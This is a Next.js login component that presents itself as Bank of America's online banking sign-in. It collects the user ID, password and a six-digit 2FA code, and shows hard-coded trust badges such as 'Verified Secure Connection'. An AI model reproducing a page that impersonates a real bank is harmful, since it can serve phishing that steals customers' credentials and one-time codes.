import React, { useState, useEffect } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { Shield, Lock, Mail, ArrowRight, Eye, EyeOff, CheckCircle2, ShieldCheck, KeyRound } from 'lucide-react';
import { useAuth } from '../utils/AuthContext';

const Login = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [show2FA, setShow2FA] = useState(false);
  const [twoFactorCode, setTwoFactorCode] = useState('');
  const [twoFactorTicket, setTwoFactorTicket] = useState('');
  const [timeoutNotice, setTimeoutNotice] = useState(false);
  const router = useRouter();
  const { login } = useAuth();

  useEffect(() => {
    if (typeof window !== 'undefined') {
      const params = new URLSearchParams(window.location.search);
      if (params.get('reason') === 'timeout') {
        setTimeoutNotice(true);
      }
      const savedEmail = localStorage.getItem('boa_saved_id');
      if (savedEmail) {
        setEmail(savedEmail);
        setRememberMe(true);
      }
    }
  }, []);

  const handleLogin = async (e) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    if (rememberMe) {
      localStorage.setItem('boa_saved_id', email);
    } else {
      localStorage.removeItem('boa_saved_id');
    }

    try {
      const res = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email,
          password,
          twoFactorCode: show2FA ? twoFactorCode : undefined,
          twoFactorTicket: show2FA ? twoFactorTicket : undefined,
        }),
      });
      const data = await res.json();
      if (!res.ok) {
        setError(data.message || 'Invalid credentials.');
        setLoading(false);
        return;
      }
      if (data.require2fa) {
        setShow2FA(true);
        if (data.twoFactorTicket) {
          setTwoFactorTicket(data.twoFactorTicket);
        }
        setError('');
        setLoading(false);
        return;
      }
      if (data.user) {
        login(data.user);
        setLoading(false);
        if (data.user.role === 'superadmin') {
          router.push('/super-admin');
        } else if (data.user.role === 'admin') {
          router.push('/admin');
        } else {
          router.push('/dashboard');
        }
        return;
      }
      setError('Unexpected response.');
      setLoading(false);
    } catch (err) {
      setError('Network error. Please try again.');
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#f0f4f8] via-[#f7f9fb] to-[#ffffff] flex flex-col justify-between">
      {/* Top Brand Header Bar */}
      <header className="w-full bg-white border-b border-neutral-200/80 shadow-xs">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between">
          <div className="flex items-center space-x-2.5 sm:space-x-3">
            <img
              src="/logo.png"
              alt="Bank of America"
              className="h-8 sm:h-9 w-auto object-contain"
            />
            <span className="text-primary-navy font-bold text-base sm:text-xl tracking-tight">
              Bank of America
            </span>
          </div>
          <div className="flex items-center space-x-4 text-xs font-medium text-neutral-600">
            <span className="inline-flex items-center space-x-1.5 text-emerald-700 bg-emerald-50 px-2.5 py-1 rounded-full border border-emerald-200">
              <ShieldCheck className="w-3.5 h-3.5" />
              <span>Verified Secure Connection</span>
            </span>
          </div>
        </div>
      </header>

      {/* Main Login Area */}
      <main className="flex-1 flex items-center justify-center px-4 py-10 sm:py-14">
        <div className="w-full max-w-md animate-fade-in">
          {/* Card */}
          <div className="bg-white rounded-2xl shadow-xl border border-neutral-200/90 overflow-hidden">
            {/* Signature Top Accent Stripe (Bank of America Red & Blue) */}
            <div className="h-1.5 w-full bg-gradient-to-r from-red-600 via-primary-blue to-primary-navy" />

            <div className="p-6 sm:p-8">
              {/* Card Title */}
              <div className="text-center mb-6">
                <div className="inline-flex items-center justify-center space-x-2.5 mb-3">
                  <img
                    src="/logo.png"
                    alt="Bank of America"
                    className="h-8 w-auto object-contain"
                  />
                  <span className="text-primary-navy font-bold text-xl tracking-tight">
                    Bank of America
                  </span>
                </div>
                <h1 className="text-xl sm:text-2xl font-bold text-primary-navy tracking-tight">
                  {show2FA ? 'Identity Verification' : 'Sign In to Online Banking'}
                </h1>
                <p className="text-xs sm:text-sm text-neutral-500 mt-1">
                  {show2FA
                    ? 'Enter the 6-digit security code sent to your registered device'
                    : 'Please enter your User ID and Password to continue'}
                </p>
              </div>

              {timeoutNotice && (
                <div className="mb-5 p-3.5 bg-amber-50 border border-amber-200 rounded-xl flex items-start space-x-2.5 text-amber-900 text-xs sm:text-sm animate-fade-in">
                  <Lock className="w-4 h-4 mt-0.5 text-amber-600 flex-shrink-0" />
                  <div>
                    <p className="font-semibold text-amber-950">Session Timed Out</p>
                    <p className="text-xs text-amber-800 mt-0.5">
                      For your protection, you were logged out after a period of inactivity. Please sign in again.
                    </p>
                  </div>
                </div>
              )}

              <form onSubmit={handleLogin} className="space-y-4">
                {!show2FA ? (
                  <>
                    {/* User ID / Email */}
                    <div>
                      <label className="block text-xs font-bold uppercase tracking-wider text-neutral-700 mb-1.5">
                        User ID / Email Address
                      </label>
                      <input
                        type="email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        placeholder="yourname@example.com"
                        required
                        className="w-full px-4 py-3 bg-neutral-50 border border-neutral-300 rounded-xl text-neutral-900 placeholder-neutral-400 text-sm focus:outline-none focus:ring-2 focus:ring-primary-blue focus:bg-white transition-all"
                      />
                    </div>

                    {/* Password */}
                    <div>
                      <div className="flex items-center justify-between mb-1.5">
                        <label className="block text-xs font-bold uppercase tracking-wider text-neutral-700">
                          Password
                        </label>
                        <Link href="/forgot-password" className="text-xs text-primary-blue hover:underline font-semibold">
                          Forgot ID/Password?
                        </Link>
                      </div>
                      <div className="relative">
                        <input
                          type={showPassword ? 'text' : 'password'}
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          placeholder="Enter your password"
                          required
                          className="w-full px-4 py-3 pr-11 bg-neutral-50 border border-neutral-300 rounded-xl text-neutral-900 placeholder-neutral-400 text-sm focus:outline-none focus:ring-2 focus:ring-primary-blue focus:bg-white transition-all"
                        />
                        <button
                          type="button"
                          onClick={() => setShowPassword(!showPassword)}
                          className="absolute right-3 top-1/2 -translate-y-1/2 text-neutral-400 hover:text-neutral-700 transition-colors p-1"
                          aria-label="Toggle password visibility"
                        >
                          {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                        </button>
                      </div>
                    </div>

                    {/* Remember ID & Security Notice */}
                    <div className="flex items-center justify-between pt-1">
                      <label className="flex items-center space-x-2 text-xs text-neutral-600 cursor-pointer select-none">
                        <input
                          type="checkbox"
                          checked={rememberMe}
                          onChange={(e) => setRememberMe(e.target.checked)}
                          className="rounded border-neutral-300 text-primary-blue focus:ring-primary-blue w-4 h-4"
                        />
                        <span>Save this User ID</span>
                      </label>
                      <span className="text-[11px] text-neutral-400 flex items-center space-x-1">
                        <Lock className="w-3 h-3 text-neutral-400" />
                        <span>TLS 1.3</span>
                      </span>
                    </div>

                    {error && (
                      <div className="p-3 bg-red-50 border border-red-200 rounded-xl text-red-700 text-xs flex items-start space-x-2 animate-fade-in">
                        <Lock className="w-4 h-4 text-red-500 flex-shrink-0 mt-0.5" />
                        <span>{error}</span>
                      </div>
                    )}

                    {/* Sign In Button */}
                    <button
                      type="submit"
                      disabled={loading}
                      className="w-full py-3.5 px-4 rounded-xl bg-primary-blue hover:bg-[#0041a8] text-white font-bold text-sm shadow-md hover:shadow-lg transition-all flex items-center justify-center space-x-2 disabled:opacity-60 mt-2"
                    >
                      <span>{loading ? 'Signing in securely...' : 'Sign In'}</span>
                      {!loading && <ArrowRight className="w-4 h-4" />}
                    </button>
                  </>
                ) : (
                  <>
                    <div className="text-center py-2">
                      <div className="inline-flex items-center justify-center w-14 h-14 bg-blue-50 text-primary-blue rounded-full mb-3 border border-blue-100">
                        <KeyRound className="w-7 h-7" />
                      </div>
                      <p className="text-xs text-neutral-600">
                        For your security, we require multi-factor authorization.
                      </p>
                    </div>

                    <div>
                      <label className="block text-xs font-bold uppercase tracking-wider text-neutral-700 mb-1.5 text-center">
                        6-Digit Security Code
                      </label>
                      <input
                        type="text"
                        value={twoFactorCode}
                        onChange={(e) => setTwoFactorCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                        placeholder="000000"
                        maxLength={6}
                        autoFocus
                        required
                        className="w-full text-center tracking-[0.4em] font-mono text-xl py-3 px-4 bg-neutral-50 border border-neutral-300 rounded-xl text-neutral-900 focus:outline-none focus:ring-2 focus:ring-primary-blue focus:bg-white transition-all font-bold"
                      />
                    </div>

                    {error && (
                      <div className="p-3 bg-red-50 border border-red-200 rounded-xl text-red-700 text-xs flex items-start space-x-2 animate-fade-in">
                        <Lock className="w-4 h-4 text-red-500 flex-shrink-0 mt-0.5" />
                        <span>{error}</span>
                      </div>
                    )}

                    <button
                      type="submit"
                      disabled={loading || twoFactorCode.length !== 6}
                      className="w-full py-3.5 px-4 rounded-xl bg-primary-blue hover:bg-[#0041a8] text-white font-bold text-sm shadow-md hover:shadow-lg transition-all flex items-center justify-center space-x-2 disabled:opacity-60"
                    >
                      <span>{loading ? 'Verifying...' : 'Authorize & Continue'}</span>
                      {!loading && <CheckCircle2 className="w-4 h-4" />}
                    </button>

                    <button
                      type="button"
                      onClick={() => {
                        setShow2FA(false);
                        setTwoFactorCode('');
                        setError('');
                      }}
                      className="w-full text-xs text-neutral-500 hover:text-neutral-800 text-center py-2 transition-colors"
                    >
                      ← Back to Sign In
                    </button>
                  </>
                )}
              </form>
            </div>
          </div>

          {/* Security & FDIC Badges */}
          <div className="mt-6 grid grid-cols-3 gap-2 text-center text-[11px] text-neutral-500">
            <div className="p-2 bg-white/70 rounded-lg border border-neutral-200/60 shadow-xs flex flex-col items-center">
              <Shield className="w-4 h-4 text-primary-blue mb-1" />
              <span className="font-semibold text-neutral-700">FDIC Insured</span>
              <span className="text-[10px] text-neutral-400">Up to $250,000</span>
            </div>
            <div className="p-2 bg-white/70 rounded-lg border border-neutral-200/60 shadow-xs flex flex-col items-center">
              <Lock className="w-4 h-4 text-emerald-600 mb-1" />
              <span className="font-semibold text-neutral-700">256-Bit TLS</span>
              <span className="text-[10px] text-neutral-400">Bank-Grade Crypto</span>
            </div>
            <div className="p-2 bg-white/70 rounded-lg border border-neutral-200/60 shadow-xs flex flex-col items-center">
              <ShieldCheck className="w-4 h-4 text-primary-navy mb-1" />
              <span className="font-semibold text-neutral-700">Zero Liability</span>
              <span className="text-[10px] text-neutral-400">Fraud Protection</span>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="w-full bg-white border-t border-neutral-200/80 py-5 text-center text-xs text-neutral-500">
        <div className="max-w-6xl mx-auto px-4 flex items-center justify-center">
          <p>
            © {new Date().getFullYear()} Bank of America Corporation. All rights reserved. Member FDIC.
          </p>
        </div>
      </footer>
    </div>
  );
};

export default Login;
